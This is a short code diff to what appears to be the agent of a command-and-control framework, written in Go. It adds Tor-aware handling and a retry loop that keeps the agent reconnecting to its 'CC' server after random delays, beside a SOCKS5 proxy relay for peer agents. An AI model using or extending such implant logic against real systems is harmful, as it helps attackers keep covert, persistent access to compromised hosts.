@@ -79,7 +79,7 @@ func main() {
 		ctx, cancel := context.WithCancel(context.Background())
 		log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
 		go agent.StartBroadcast(true, ctx, cancel)
-	} else {
+	} else if !tun.IsTor(agent.CCAddress) {
 		// we don't, just wait for some other agents to help us
 		log.Println("[-] We don't have internet access, waiting for other agents to give us a proxy...")
 		ctx, cancel := context.WithCancel(context.Background())
@@ -150,6 +150,7 @@ connect:
 	if !agent.IsCCOnline(agent.AgentProxy) {
 		log.Println("CC not online")
 		time.Sleep(time.Duration(agent.RandInt(1, 120)) * time.Minute)
+		goto connect
 	}
 
 	// check in with system info
